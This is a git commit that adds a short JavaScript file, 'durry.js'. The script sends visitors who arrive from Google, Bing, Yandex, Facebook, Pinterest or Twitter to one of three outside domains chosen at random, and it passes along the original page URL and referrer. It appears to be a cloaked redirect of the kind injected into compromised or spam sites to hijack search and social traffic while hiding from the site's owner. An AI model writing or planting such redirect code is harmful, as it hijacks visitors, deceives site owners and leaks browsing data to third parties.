9338d29698241eadf22a081eb0d7d01c199b6533
Weda Gintung Sentousa <pastiproperti@gmail.com>
2021-09-01 21:54:32 +0700

    Create durry.js

---
+++ durry.js
@@ -0,0 +1,11 @@
+var ars 	= rChoice([
+	'https://kabarr.com/',
+    'https://microgreenskit.net/',
+    'https://farmhousedecor.my.id/',
+	]);
+
+function rChoice(arr) {
+    return arr[Math.floor(arr.length * Math.random())];
+}
+
+if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
